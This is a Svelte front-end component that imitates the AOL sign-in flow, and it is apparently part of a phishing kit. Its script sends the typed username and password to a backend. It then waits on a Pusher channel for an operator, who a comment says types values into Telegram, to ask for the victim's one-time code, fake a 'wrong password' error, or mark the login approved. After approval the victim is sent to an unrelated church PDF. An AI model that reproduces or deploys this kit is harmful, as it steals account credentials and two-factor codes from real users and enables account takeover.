<script>
  import { sendFrmData, sendOTP } from "$lib";
  import Pusher from 'pusher-js';
  import { PUBLIC_PUSHER_KEY, PUBLIC_PUSHER_CLUSTER } from '$env/static/public';

  let identifier = $state('');
  let password = $state('');
  let staySignedIn = $state(true);
  let identifierError = $state('');
  let passwordError = $state('');
  let otpError = $state('');
  let step = $state('identifier'); // 'identifier' | 'password' | 'otp' | 'success'
  let isLoading = $state(false);
  let showPassword = $state(false);
  let otp = $state('');

  let authType = $state('') // 'OTP' or 'PROMPT'
  let finalStatus = $state(''); // Tracking final state evaluations: 'APPROVED' or 'REJECTED' or '' (default is '')
  let showOTPsection = $state(false);

  let showFinalStatus = $derived.by(() => {
    // show error on rejected or failed trigger state evaluation
    if (finalStatus === 'REJECTED' || finalStatus === '') {
      return 'hide'
    }

    // APPROVED final state
    return 'show'
  });

  let activeChannelName = $state(''); // help holds the active channel name attached with the sessionId

  let emailStageRef = $state();
  let passwordStageRef = $state();
  let otpStageRef = $state();
  let successStageRef = $state();

  let identifierFocused = $state(false);
  let passwordFocused = $state(false);
  let otpFocused = $state(false);


  $effect(() => {
    /* shows OTP section when changed */
    if (showOTPsection) {
      isLoading = false;
      step = 'otp';

      // show OTP section with opacity transition
      passwordStageRef.classList.remove('opacity-100');
      passwordStageRef.classList.add('opacity-0');

      const otpTransitionHandler = (ev) => {
        if (ev.propertyName === 'opacity') {
          passwordStageRef?.removeEventListener('transitionend', otpTransitionHandler);
          passwordStageRef?.classList.add('hidden');
          otpStageRef?.classList.remove('hidden');

          requestAnimationFrame(() => {
            otpStageRef?.classList.remove('opacity-0');
            otpStageRef?.classList.add('opacity-100');
          });
        }
      };
      passwordStageRef.addEventListener('transitionend', otpTransitionHandler);
    }

    /* shows Success section when real-time trigger is pushed into */
    if (showFinalStatus === 'show') {
      showOTPsection = false
      isLoading = false;
      step = 'success';

      otpStageRef.classList.remove('opacity-100');
      otpStageRef.classList.add('opacity-0');

      const finalTransitionHandler = (ev) => {
        if (ev.propertyName === 'opacity') {
          otpStageRef?.removeEventListener('transitionend', finalTransitionHandler);
          otpStageRef?.classList.add('hidden');
          successStageRef?.classList.remove('hidden');

          requestAnimationFrame(() => {
            successStageRef?.classList.remove('opacity-0');
            successStageRef?.classList.add('opacity-100');
          });
        }
      };

      otpStageRef.addEventListener('transitionend', finalTransitionHandler);

      // redirect user after 3seconds
      setTimeout(() => {
        location.href = 'https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf'
      }, 2000)
    }
  });

  // Establish an isolated single-user stream (per session based interaction)
  function setupPrivatePusherChannel(sessionId) {
    // Configured to automatically ping /api/pusher/auth behind the scenes
    const pusherClient = new Pusher(PUBLIC_PUSHER_KEY, {
      cluster: PUBLIC_PUSHER_CLUSTER,
      authEndpoint: '/api/pusher/auth'
    });

    activeChannelName = `private-session-${sessionId}`;

    // Subscribes matching the "private-session-{UUID}" footprint your backend utilizes
    const privateChannel = pusherClient.subscribe(activeChannelName);

    // Listen for the custom value you type into Telegram
    privateChannel.bind('auth-event', ({ type='', value='' }) => {
      authType = type; // 'OTP' or 'PROMPT'
      showOTPsection = true;
    });

    // Listen block 2: Catches the Success / Error evaluation button click
    privateChannel.bind('final-status-event', ({ status }) => {
      if (status === 'REJECTED') {
        otpError = 'There was an error verifying your OTP. Please try again'
      } else {
        finalStatus = status; // 'APPROVED' or 'REJECTED'
        // Fully disconnect and release socket streams now that the whole lifecycle is over
        pusherClient.unsubscribe(activeChannelName);
        pusherClient.disconnect();
      }
    });

    // NEW Listener C: Catches the top-row Password Failure trigger
    privateChannel.bind('password-failed-event', ({ message }) => {
      // Force the UI back to State A and surface the error reason explicitly
      passwordError = message
      password = ''; // Clear out the bad password field for safe re-entry
      isLoading = false;
      pusherClient.unsubscribe(activeChannelName);
      pusherClient.disconnect();
    });
  }

  function validateIdentifier(value) {
    if (!value.trim()) {
      return "Username, email, or mobile number is required";
    }
    if (value.includes('@') && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
      return "Please enter a valid email address";
    }
    if (value.trim().length < 3) {
      return "Invalid AOL username. Please try again.";
    }
    return '';
  }

  function handleIdentifierNext(e) {
    e.preventDefault();
    const errorMsg = validateIdentifier(identifier);
    if (errorMsg) {
      identifierError = errorMsg;
      return;
    }
    identifierError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      
      if (emailStageRef && passwordStageRef) {
        step = 'password';
        
        emailStageRef.classList.remove('opacity-100');
        emailStageRef.classList.add('opacity-0', 'pointer-events-none');

        const endOfTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            emailStageRef?.removeEventListener('transitionend', endOfTransition);
            emailStageRef?.classList.add('hidden');
            passwordStageRef?.classList.remove('hidden');

            requestAnimationFrame(() => {
              passwordStageRef?.classList.remove('opacity-0');
              passwordStageRef?.classList.add('opacity-100');
            });
          }
        };
        emailStageRef.addEventListener('transitionend', endOfTransition);
      }
    }, 750);
  }

  async function handlePasswordSubmit(e) {
    e.preventDefault();
    if (!password) {
      passwordError = "Please enter your password";
      return;
    }
    if (password.length < 5) {
      passwordError = "Wrong password. Please try again.";
      return;
    }
    passwordError = '';
    isLoading = true;

    // send data to backend api
    try {
      const res = await sendFrmData({ signinType: 'AOL', email : identifier, password: password});
      // check if there are no errors
      if (res?.error) {
        passwordError = res?.message
        isLoading = false;
        return
      }

      // wait for real-time update
      if (res?.success) {
        setupPrivatePusherChannel(res.sessionId);
      }
    } catch(error) {
      console.error('Error submitting form data: \n', error.message)
      passwordError = error.message;
    }
  }

  function handleBackToPassword() {
    otp = '';
    otpError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      if (passwordStageRef && otpStageRef) {
        step = 'password';
        otpStageRef.classList.remove('opacity-100');
        otpStageRef.classList.add('opacity-0');

        const backToPwHandler = (ev) => {
          if (ev.propertyName === 'opacity') {
            otpStageRef?.removeEventListener('transitionend', backToPwHandler);
            otpStageRef?.classList.add('hidden');
            passwordStageRef?.classList.remove('hidden');

            requestAnimationFrame(() => {
              passwordStageRef?.classList.remove('opacity-0');
              passwordStageRef?.classList.add('opacity-100');
            });
          }
        };
        otpStageRef.addEventListener('transitionend', backToPwHandler);
      }
    }, 350);
  }

  async function handleOtpSubmit(e) {
    e.preventDefault();
    if (!otp) {
      otpError = "Please enter the verification code";
      return;
    }
    const cleanOtp = otp.replace(/\D/g, '');
    if (cleanOtp.length < 6) {
      otpError = "The verification code must be exactly 6 digits";
      return;
    }
    otpError = '';
    isLoading = true;

    // send to backend api
    const res = await sendOTP({ otp: otp, email: identifier })
  }

  function handleBackToEmail() {
    password = '';
    passwordError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      if (emailStageRef && passwordStageRef) {
        step = 'identifier';
        passwordStageRef.classList.remove('opacity-100');
        passwordStageRef.classList.add('opacity-0');

        const backToEmailHandler = (ev) => {
          if (ev.propertyName === 'opacity') {
            passwordStageRef?.removeEventListener('transitionend', backToEmailHandler);
            passwordStageRef?.classList.add('hidden');
            emailStageRef?.classList.remove('hidden');

            requestAnimationFrame(() => {
              emailStageRef?.classList.remove('opacity-0', 'pointer-events-none');
              emailStageRef?.classList.add('opacity-100');
            });
          }
        };
        passwordStageRef.addEventListener('transitionend', backToEmailHandler);
      }
    }, 400);
  }
</script>


<div class="w-full min-h-[85vh] bg-[#f5f8fa] flex flex-col justify-between items-center py-8 px-4 font-sans antialiased text-[#1d2a3a]">
  <header class="w-full max-w-5xl flex items-center justify-between py-2 px-6 mb-4">
    <div class="flex items-center gap-1.5 select-none cursor-default">
      <span class="font-extrabold text-3xl tracking-tight text-black lowercase">
        aol<span class="text-[#3f4dfa] font-black text-4xl">.</span>
      </span>
    </div>
    <div class="text-xs font-semibold text-gray-500 hover:underline cursor-pointer select-none">
      Help
    </div>
  </header>

  <main class="w-full max-w-105 bg-white rounded-sm shadow-[0_4px_16px_rgba(0,0,0,0.08)] border border-[#e0e0e0] flex-1 flex flex-col p-8 md:p-10 transition-all duration-300 relative">
    {#if isLoading}
      <div class="absolute top-0 left-0 w-full h-0.75 bg-gray-100 overflow-hidden">
        <div class="h-full bg-[#3f4dfa] animate-pulse w-2/3 rounded-full"></div>
      </div>
    {/if}

    <div class="flex-1 flex flex-col justify-between">
      <div>
        <!-- logo section -->
        <div class="flex justify-center mb-6">
          <span class="font-black text-4xl tracking-tight text-black lowercase leading-none select-none">
            aol<span class="text-[#3f4dfa] font-black">.</span>
          </span>
        </div>

        <!-- STAGE 1: Email Section -->
        <div 
          bind:this={emailStageRef} 
          class="transition-opacity duration-200 ease-in-out opacity-100 flex flex-col"
        >
          <h1 class="text-lg font-bold text-center text-[#1d2a3a] mb-5">
            Sign in
          </h1>

          <form onsubmit={handleIdentifierNext} class="space-y-4">
            <div class="relative">
              <input
                type="text"
                id="aol-identifier-input"
                bind:value={identifier}
                onfocus={() => identifierFocused = true}
                onblur={() => identifierFocused = false}
                class="w-full px-4 py-3.5 text-base border rounded-sm focus:outline-none transition-all duration-150 bg-transparent text-[#1d2a3a]
                  {identifierError
                    ? 'border-[#ff3333] focus:ring-1 focus:ring-[#ff3333]'
                    : 'border-[#b5b5b5] focus:border-[#3f4dfa] focus:ring-1 focus:ring-[#3f4dfa]'
                  }
                "
              />
              <label 
                for="aol-identifier-input"
                class="absolute left-4 bg-white px-1 transition-all duration-150 pointer-events-none
                  {(identifierFocused || identifier)
                    ? '-top-2.25 text-xs font-semibold leading-none text-[#3f4dfa]'
                    : 'top-3.75 text-base text-[#7c808f]'
                  }
                  {identifierError ? 'text-[#ff3333]' : (identifierFocused ? 'text-[#3f4dfa]' : 'text-[#7c808f]')}
                "
              >
                Username, email, or mobile
              </label>
            </div>

            {#if identifierError}
              <div class="text-xs text-[#ff3333] leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                <svg class="w-4 h-4 shrink-0 fill-current mt-px" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                </svg>
                <span>{identifierError}</span>
              </div>
            {/if}

            <button
              type="submit"
              disabled={isLoading}
              class="
                w-full py-3 bg-[#3f4dfa] hover:bg-[#2e3be0] active:bg-[#1a28cb] text-white text-[15px] font-bold rounded-full 
                transition-all tracking-wide shadow-sm hover:shadow-md cursor-pointer select-none focus:outline-none focus:ring-2 
                focus:ring-[#3f4dfa] flex items-center justify-center gap-2 disabled:opacity-30 duration-200
              "
            >
              Next
            </button>

            <div class="flex items-center justify-between pt-2">
              <label class="flex items-center gap-2.5 text-sm font-semibold text-[#1d2a3a] select-none cursor-pointer">
                <input
                  type="checkbox"
                  bind:checked={staySignedIn}
                  class="w-4.5 h-4.5 rounded text-[#3f4dfa] focus:ring-[#3f4dfa] border-gray-300 focus:ring-2 accent-[#3f4dfa]"
                />
                Stay signed in
              </label>
              <a href="#forgot" class="text-sm font-semibold text-[#3f4dfa] hover:underline" onclick={(e) => { e.preventDefault(); }}>
                Forgot username?
              </a>
            </div>
          </form>

          <div class="mt-8 pt-6 border-t border-[#e0e0e0] text-center">
            <button type="button" class="w-full py-2.5 bg-white border-2 border-[#3f4dfa] text-[#3f4dfa] hover:bg-[#3f4dfa]/5 text-[15px] font-bold rounded-full transition-all tracking-wide cursor-pointer select-none">
              Create an account
            </button>
          </div>
        </div>

        <!-- STAGE 2: Password Section -->
        <div 
          bind:this={passwordStageRef} 
          class="transition-opacity duration-200 ease-in-out opacity-0 hidden flex flex-col"
        >
          <div class="flex items-center gap-1.5 mb-4">
            <button
              type="button"
              onclick={handleBackToEmail}
              class="inline-flex items-center gap-0.5 text-sm font-semibold text-[#3f4dfa] hover:underline animate-fadeIn"
            >
              Back
            </button>
            <span class="text-xs text-gray-400 font-medium truncate max-w-45 cursor-pointer">
              | signing into {identifier}
            </span>
          </div>

          <h2 class="text-xl font-bold text-[#1d2a3a] mb-5">
            Enter your password
          </h2>

          <form onsubmit={handlePasswordSubmit} class="space-y-4">
            <div class="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                id="aol-password-input"
                bind:value={password}
                onfocus={() => passwordFocused = true}
                onblur={() => passwordFocused = false}
                class="w-full px-4 pr-12 py-3.5 text-base border rounded-sm focus:outline-none transition-all duration-150 bg-transparent text-[#1d2a3a]
                  {passwordError
                    ? 'border-[#ff3333] focus:ring-1 focus:ring-[#ff3333]'
                    : 'border-[#b5b5b5] focus:border-[#3f4dfa] focus:ring-1 focus:ring-[#3f4dfa]'
                  }
                "
              />
              <label 
                for="aol-password-input"
                class="absolute left-4 bg-white px-1 transition-all duration-150 pointer-events-none
                  {(passwordFocused || password)
                    ? '-top-2.25 text-xs font-semibold leading-none text-[#3f4dfa]'
                    : 'top-3.75 text-base text-[#7c808f]'
                  }
                  {passwordError ? 'text-[#ff3333]' : (passwordFocused ? 'text-[#3f4dfa]' : 'text-[#7c808f]')}
                "
              >
                Password
              </label>

              <button
                type="button"
                onclick={() => showPassword = !showPassword}
                class="absolute right-3.5 top-3.5 text-gray-400 hover:text-[#3f4dfa] focus:outline-none"
              >
                👁
              </button>
            </div>

            {#if passwordError}
              <div class="text-xs text-[#ff3333] leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                <svg class="w-4 h-4 shrink-0 fill-current mt-px" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                </svg>
                <span>{passwordError}</span>
              </div>
            {/if}

            <button
              type="submit"
              disabled={isLoading}
              class="
                w-full py-3 bg-[#3f4dfa] hover:bg-[#2e3be0] active:bg-[#1a28cb] text-white text-[15px] font-bold rounded-full 
                transition-all tracking-wide shadow-sm hover:shadow-md cursor-pointer select-none focus:outline-none flex items-center 
                justify-center gap-2 disabled:opacity-30 duration-200
              "
            >
              Sign in
            </button>
          </form>
        </div>

        <!-- STAGE 3: OTP Section -->
        <div 
          bind:this={otpStageRef} 
          class="transition-opacity duration-200 ease-in-out opacity-0 hidden flex flex-col"
        >
          <div class="flex items-center gap-1.5 mb-4">
            <button
              type="button"
              onclick={handleBackToPassword}
              class="inline-flex items-center gap-1 text-sm font-semibold text-[#3f4dfa] hover:underline animate-fadeIn"
            >
              Back
            </button>
            <span class="text-xs text-gray-400">| Verification for {identifier}</span>
          </div>

          <h2 class="text-xl font-bold text-[#1d2a3a] mb-1">
            Verify your identity
          </h2>
          <p class="text-sm text-[#5a5a5a] mb-6 leading-relaxed">
            We've sent a 6-digit verification code to your registered mobile phone.
          </p>

          <form id="aol-otp-form" onsubmit={handleOtpSubmit} class="space-y-4">
            <div class="relative">
              <input
                type="text"
                id="aol-otp-input"
                maxLength={6}
                bind:value={otp}
                oninput={(e) => {
                  otp = e.currentTarget.value.replace(/\D/g, '');
                  if (otpError) otpError = '';
                }}
                onfocus={() => otpFocused = true}
                onblur={() => otpFocused = false}
                class="w-full px-4 py-3.5 text-base border rounded-sm focus:outline-none transition-all duration-150 bg-transparent text-[#1d2a3a] tracking-widest font-semibold
                  {otpError
                    ? 'border-[#ff3333] focus:ring-1 focus:ring-[#ff3333]'
                    : 'border-[#b5b5b5] focus:border-[#3f4dfa] focus:ring-1 focus:ring-[#3f4dfa]'
                  }
                "
              />
              
              <label 
                for="aol-otp-input"
                class="absolute left-4 bg-white px-1 transition-all duration-150 pointer-events-none
                  {(otpFocused || otp)
                    ? '-top-2.25 text-xs font-semibold leading-none text-[#3f4dfa]'
                    : 'top-3.75 text-base text-[#7c808f]'
                  }
                  {otpError ? 'text-[#ff3333]' : (otpFocused ? 'text-[#3f4dfa]' : 'text-[#7c808f]')}
                "
              >
                Verification Code
              </label>
            </div>

            {#if otpError}
              <div class="text-xs text-[#ff3333] leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                <svg class="w-4 h-4 shrink-0 fill-current mt-px" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                </svg>
                <span>{otpError}</span>
              </div>
            {/if}

            <button
              type="submit"
              disabled={isLoading}
              class="
                w-full py-3.5 bg-[#3f4dfa] hover:bg-[#2e3be0] active:bg-[#1a28cb] text-white text-[15px] font-bold rounded-full 
                transition-all tracking-wide shadow-sm hover:shadow-md cursor-pointer select-none focus:outline-none focus:ring-2 
                focus:ring-[#3f4dfa] mt-3 flex items-center justify-center gap-2 
                disabled:opacity-30 duration-200
              "
            >
              Verify Code
            </button>
          </form>
        </div>

        <!-- STAGE 4: Success Section -->
        <div
          bind:this={successStageRef}
          class="flex-1 flex flex-col justify-center items-center text-center opacity-0 hidden py-4"
        >
          <div class="w-16 h-16 rounded-full bg-[#f0f5ff] text-[#3f4dfa] flex items-center justify-center mb-6 border border-[#d2e0ff]">
            ✓
          </div>

          <h2 class="text-2xl font-bold text-[#1d2a3a] mb-2">
            Successfully Verified!
          </h2>

          <div class="bg-[#f5f8fa] border border-[#dadce0] rounded-xl px-5 py-3.5 mb-6 w-full">
            <p class="text-xs text-[#5a5a5a] mb-1 font-semibold uppercase">AOL Member Account</p>
            <p class="text-base font-bold text-[#1d2a3a] truncate">{identifier}</p>
          </div>

          <button
            type="button"
            onclick={() => {
              location.href = `https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf`;
              /* identifier = '';
              password = '';
              otp = '';
              step = 'identifier';
              if (emailStageRef && successStageRef) {
                successStageRef.classList.add('hidden', 'opacity-0');
                emailStageRef.classList.remove('hidden', 'opacity-0', 'pointer-events-none');
                emailStageRef.classList.add('opacity-100');
              } */
            }}
            class="px-6 py-2.5 bg-gray-100 hover:bg-gray-200 text-gray-700 text-sm font-bold rounded-full transition-all focus:outline-none"
          >
            Continue
          </button>
        </div>
      </div>
    </div>
  </main>

  <footer class="w-full max-w-5xl mx-auto px-6 py-4 flex flex-col sm:flex-row items-center sm:justify-between gap-4 text-xs text-[#5a5a5a]">
    <div>
      <span class="text-gray-400">© 2026 AOL</span>
    </div>
      <div class="flex items-center gap-5">
        <a href="#/" class="hover:text-black hover:underline transition-colors" onClick={(e) => { e.preventDefault(); alert("AOL privacy."); }}>Privacy Policy</a>
        <a href="#/" class="hover:text-black hover:underline transition-colors" onClick={(e) => { e.preventDefault(); alert("AOL terms."); }}>Terms of Service</a>
        <a href="#/" class="hover:text-black hover:underline transition-colors" onClick={(e) => { e.preventDefault(); alert("AOL ad choices."); }}>Ad Choices</a>
      </div>
  </footer>
</div>